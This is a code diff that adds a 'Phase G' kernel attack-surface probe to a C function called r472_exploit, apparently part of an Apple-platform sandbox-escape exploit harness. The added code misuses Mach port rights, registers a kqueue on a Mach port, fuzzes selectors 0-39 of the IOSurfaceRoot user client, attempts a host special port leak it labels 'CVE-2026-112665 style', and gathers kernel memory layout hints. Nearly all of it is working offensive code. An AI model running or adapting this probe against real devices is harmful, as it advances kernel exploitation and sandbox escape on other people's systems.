@@ -17516,6 +17516,91 @@ static void r472_exploit(void) {
         }
     }
 
+    /* ---- Phase G: Kernel attack surface probe ---- */
+    rlog("\n  --- Phase G: Kernel attack surface from sandbox ---\n");
+    fflush(stdout);
+
+    /* G1: Mach port operations — test OOL message descriptors */
+    {
+        mach_port_t port = MACH_PORT_NULL;
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &port);
+        rlog("    G1: mach_port_allocate: kr=0x%x port=0x%x\n", kr, port);
+        if (kr == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self(), port, port,
+                MACH_MSG_TYPE_MAKE_SEND);
+            mach_port_deallocate(mach_task_self(), port);
+            mach_port_mod_refs(mach_task_self(), port,
+                MACH_PORT_RIGHT_RECEIVE, -1);
+        }
+    }
+
+    /* G2: kqueue + EVFILT_MACHPORT */
+    {
+        int kq = kqueue();
+        rlog("    G2: kqueue: fd=%d errno=%d\n", kq, kq < 0 ? errno : 0);
+        if (kq >= 0) {
+            mach_port_t p = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+            struct kevent64_s ev = {0};
+            ev.ident = p;
+            ev.filter = EVFILT_MACHPORT;
+            ev.flags = EV_ADD | EV_ENABLE;
+            int r = kevent64(kq, &ev, 1, NULL, 0, 0, NULL);
+            rlog("    G2: kevent64 EVFILT_MACHPORT: r=%d errno=%d\n",
+                 r, r < 0 ? errno : 0);
+            mach_port_mod_refs(mach_task_self(), p,
+                MACH_PORT_RIGHT_RECEIVE, -1);
+            close(kq);
+        }
+    }
+
+    /* G3: IOSurface external methods — scan accessible selectors */
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t uc = 0;
+        if (svc) {
+            IOServiceOpen(svc, mach_task_self(), 0, &uc);
+            IOObjectRelease(svc);
+        }
+        if (uc) {
+            rlog("    G3: IOSurfaceRoot UC opened\n");
+            for (uint32_t sel = 0; sel < 40; sel++) {
+                uint64_t out[8] = {0};
+                uint32_t ocnt = 8;
+                kern_return_t kr = IOConnectCallScalarMethod(uc, sel,
+                    NULL, 0, out, &ocnt);
+                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    rlog("    G3: sel=%u kr=0x%x ocnt=%u out0=0x%llx\n",
+                         sel, kr, ocnt, out[0]);
+                }
+            }
+            IOServiceClose(uc);
+        }
+    }
+
+    /* G4: host_special_port leak attempt (CVE-2026-112665 style) */
+    {
+        mach_port_t hp;
+        kern_return_t kr = host_get_special_port(mach_host_self(),
+            HOST_LOCAL_NODE, 4, &hp);
+        rlog("    G4: host_get_special_port(4): kr=0x%x port=0x%x\n", kr, hp);
+        kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &hp);
+        rlog("    G4: task_get_special_port(BOOTSTRAP): kr=0x%x port=0x%x\n",
+             kr, hp);
+    }
+
+    /* G5: proc_info for kernel memory layout hints */
+    {
+        int mypid = getpid();
+        struct my_proc_taskallinfo ti;
+        memset(&ti, 0, sizeof(ti));
+        int sz = proc_pidinfo(mypid, PROC_PIDTASKALLINFO, 0,
+            &ti, sizeof(ti));
+        rlog("    G5: proc_pidinfo: sz=%d\n", sz);
+    }
+
     rlog("\n=== r472 done ===\n");
     fflush(stdout);
 }
